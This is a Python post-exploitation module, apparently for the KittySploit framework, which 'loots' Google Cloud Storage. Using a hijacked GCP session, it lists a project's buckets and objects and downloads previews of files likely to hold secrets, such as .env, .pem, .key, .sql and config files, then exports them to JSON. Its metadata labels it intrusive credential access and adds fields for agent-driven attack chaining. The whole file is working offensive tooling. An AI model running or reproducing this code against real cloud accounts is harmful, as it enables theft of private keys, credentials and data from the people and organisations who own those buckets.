#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
from urllib.parse import quote

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Storage Bucket Objects Loot",
        "description": "List and optionally preview objects from Cloud Storage buckets",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "gcs", "storage", "loot"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'api_request'],
        'expected_requests': 10,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    bucket_name = OptString("", "Specific bucket name; empty processes all project buckets", False)
    prefix = OptString("", "Object key prefix filter", False)
    max_buckets = OptInteger(10, "Maximum buckets to process", False)
    max_objects = OptInteger(50, "Maximum objects per bucket", False)
    fetch_content = OptBool(False, "Download object content for text-like files", False)
    max_content_bytes = OptInteger(8192, "Maximum bytes to read per object", False)
    export_json = OptString("", "Optional output JSON file", False)

    TEXT_EXTENSIONS = (
        ".txt", ".json", ".xml", ".yaml", ".yml", ".env", ".pem", ".key",
        ".csv", ".log", ".conf", ".cfg", ".ini", ".properties", ".sql",
    )

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            buckets = self._resolve_buckets(project_id)
            if not buckets:
                print_warning("No buckets found")
                return self.module_result(success=True, data={"buckets": []})

            max_buckets = max(1, int(self.max_buckets or 10))
            max_objects = max(1, int(self.max_objects or 50))
            loot = []

            print_info(f"Looting objects from {min(len(buckets), max_buckets)} bucket(s)...")
            for bucket in buckets[:max_buckets]:
                name = self._gcp_bucket_name(bucket)
                if not name:
                    continue
                print_info(f"Bucket: {name}")
                objects = self._list_objects(name, max_objects)
                entry = {"bucket": name, "object_count": len(objects), "objects": []}

                for obj in objects:
                    obj_name = obj.get("name", "")
                    row = {
                        "name": obj_name,
                        "size": obj.get("size"),
                        "contentType": obj.get("contentType"),
                        "updated": obj.get("updated"),
                        "md5Hash": obj.get("md5Hash"),
                    }
                    if self.fetch_content and self._should_fetch_content(obj_name, obj.get("contentType")):
                        content = self._fetch_object_content(name, obj_name)
                        row["content_preview"] = content.get("preview")
                        row["content_error"] = content.get("error")
                        if content.get("preview"):
                            print_success(f"  {obj_name} ({row.get('size')} bytes)")
                            print_info(f"    preview: {self._gcp_mask_value(content['preview'])}")
                        elif content.get("error"):
                            print_warning(f"  {obj_name}: {content['error']}")
                    else:
                        print_info(f"  {obj_name} ({row.get('size')} bytes)")
                    entry["objects"].append(row)

                loot.append(entry)
                print_info("-" * 80)

            payload = {"project_id": project_id, "buckets": loot}
            exported = self._gcp_export_json(self.export_json, payload) if self.export_json else ""
            if exported:
                print_success(f"Loot exported to {exported}")
            print_success(f"Processed {len(loot)} bucket(s)")
            return self.module_result(success=True, data=payload)
        except Exception as exc:
            print_error(f"Storage bucket object loot failed: {exc}")
            return False

    def _resolve_buckets(self, project_id):
        configured = str(self.bucket_name or "").strip()
        if configured:
            return [{"name": configured}]

        body = self._gcp_body_dict("storage_buckets")
        return body.get("items") or []

    def _list_objects(self, bucket_name, max_objects):
        prefix = str(self.prefix or "").strip()
        params = {"maxResults": min(max_objects, 1000)}
        if prefix:
            params["prefix"] = prefix
        url = f"https://storage.googleapis.com/storage/v1/b/{quote(bucket_name, safe='')}/o"
        return self._gcp_paginate_get(url, "items", max_items=max_objects, params=params)

    def _should_fetch_content(self, object_name, content_type):
        name = str(object_name or "").lower()
        ctype = str(content_type or "").lower()
        if ctype.startswith("text/") or "json" in ctype or "xml" in ctype:
            return True
        return any(name.endswith(ext) for ext in self.TEXT_EXTENSIONS)

    def _fetch_object_content(self, bucket_name, object_name):
        max_bytes = max(256, int(self.max_content_bytes or 8192))
        encoded = quote(object_name, safe="")
        url = (
            f"https://storage.googleapis.com/storage/v1/b/{quote(bucket_name, safe='')}"
            f"/o/{encoded}?alt=media"
        )
        result = self._gcp_get(url)
        if not result.get("ok"):
            return {"error": (result.get("raw") or "")[:300]}
        body = result.get("body")
        if isinstance(body, (dict, list)):
            preview = json.dumps(body, ensure_ascii=False)[:max_bytes]
        else:
            preview = str(body or "")[:max_bytes]
        return {"preview": preview}
